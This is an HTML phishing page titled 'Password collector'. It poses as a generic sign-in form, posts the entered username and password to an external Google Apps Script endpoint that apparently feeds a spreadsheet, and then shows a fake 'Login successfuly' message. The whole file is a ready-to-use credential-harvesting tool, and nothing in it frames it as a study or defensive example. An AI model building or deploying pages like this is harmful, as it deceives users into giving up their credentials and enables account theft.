<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password collector</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.0/font/bootstrap-icons.css">

</head>
<body>
    <div class="container">
       <form class="box"  autocomplete="off" method="POST" name="google-sheet">
        <h1>Sign In</h1>
        <div class="box1">
            <i class="bi bi-justify"></i>:
            <input type="text" name="Type" placeholder="Type"  class="type" id="username">
        </div>
        <div class="box1">
            <i class="bi bi-person-circle"></i>:
            <input type="text" name="Username" placeholder="Username"  class="type" id="username">
        </div>
        <div class="box1">
            <i class="bi bi-key-fill"></i>:
            <input type="password" name="Password"      placeholder="Passwords" class="type" required id="password">
        </div>
       
        
     <button class="btn" type="submit">Login</button>
        <div class="forgot">
            <a href="#">Forgotten the Password ?</a>
        </div>
    </form>
    </div>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbzjDgSEfmIkuD3IkkjSTgHmYekWzM1d275MLjRb5a_LcQ81r58BSXa6zf7VDK72wD0o/exec'
        const form = document.forms['google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => alert("Login successfuly"))
            .catch(error => console.error('Error!', error.message))
        })
      </script>
    
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>  
</body>
</html>
